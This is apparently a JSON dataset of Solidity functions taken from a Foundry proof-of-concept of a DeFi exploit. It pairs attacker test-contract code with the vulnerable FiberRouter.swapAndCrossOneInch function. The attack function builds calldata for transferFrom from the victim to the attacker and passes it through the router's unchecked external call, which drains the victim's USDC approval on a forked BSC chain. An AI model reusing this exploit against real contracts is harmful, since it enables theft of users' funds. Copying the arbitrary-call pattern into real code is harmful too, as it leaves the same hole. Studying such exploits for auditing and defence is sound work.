[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", usdc.balanceOf(address(victim)), 18);\n        uint256 victim_balance = usdc.balanceOf(address(victim));\n        wbnb.approve(address(pancakeRouter), 99_999 ether);\n        address[] memory swapPath = new address[](2);\n        swapPath[0] = address(wbnb);\n        swapPath[1] = address(usdc);\n        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(\n            1, swapPath, address(fiberrouter), block.timestamp + 20\n        );\n        bytes memory datas = abi.encodePacked(\n            abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", address(victim), address(this), victim_balance\n            )\n        );\n        emit log_Data(datas);\n        fiberrouter.swapAndCrossOneInch(\n            address(usdc),\n            0,\n            1,\n            43_114,\n            address(crossToken),\n            address(crossToken),\n            0,\n            datas,\n            address(usdc),\n            address(usdc)\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 33_874_498);\n        deal(address(wbnb), address(this), 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDC before exploit\", usdc.balanceOf(address(this)), 18);\n        attack();\n        emit log_named_decimal_uint(\"[End] Attacker USDC after exploit\", usdc.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FiberRouter",
    "source_type": "victim_contract",
    "function_name": "swapAndCrossOneInch",
    "original_code": "    function swapAndCrossOneInch(\n        address swapRouter,\n        uint256 amountIn,\n        uint256 amountCrossMin, // amountOutMin on uniswap\n        uint256 crossTargetNetwork,\n        address crossTargetToken,\n        address crossTargetAddress,\n        uint256 swapBridgeAmount,\n        bytes memory _calldata,\n        address fromToken,\n        address foundryToken\n    ) external nonReentrant {\n        amountIn = SafeAmount.safeTransferFrom(\n            fromToken,\n            msg.sender,\n            address(this),\n            amountIn\n        );\n        IERC20(fromToken).approve(swapRouter, amountIn);\n        IERC20(foundryToken).approve(pool, amountCrossMin);\n        _swapAndCrossOneInch(\n            crossTargetAddress,\n            swapRouter,\n            amountCrossMin,\n            crossTargetNetwork,\n            crossTargetToken,\n            _calldata,\n            foundryToken\n        );\n        emit Swap(\n            fromToken,\n            crossTargetToken,\n            block.chainid,\n            crossTargetNetwork,\n            amountIn,\n            _msgSender(),\n            crossTargetAddress,\n            swapBridgeAmount\n        );\n    }\n\n    /*\n     @notice Do a local swap and generate a cross-chain swap\n     @param swapRouter The local swap router\n     @param amountIn The amount in\n     @param amountCrossMin Equivalent to amountOutMin on uniswap\n     @param path The swap path\n     @param deadline The swap dealine\n     @param crossTargetNetwork The target network for the swap\n     @param crossSwapTargetTokenTo If different than crossTargetToken, a swap\n       will also be required on the other end\n     @param crossTargetAddress The target address for the swap\n     */\n",
    "description": ""
  }
]